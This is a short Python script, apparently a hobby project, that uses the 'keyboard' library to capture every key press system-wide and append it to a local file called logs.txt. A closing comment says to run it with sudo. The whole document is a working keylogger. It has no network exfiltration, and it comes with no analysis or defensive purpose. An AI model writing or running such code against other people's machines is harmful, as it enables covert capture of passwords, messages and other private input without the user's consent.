import keyboard

with open("logs.txt", "w") as file:
    file.close()


def writer(data):
    with open("logs.txt", "a") as file:
        file.write(data)


def filter_writing(char):
    if char == "space":
        return " "
    elif len(char) > 1:
        return f"[{char}]"
    else:
        return char


def logger(event):
    writer(filter_writing(event.name))


keyboard.on_press(logger)
keyboard.wait()
# run sudo python3 main.py
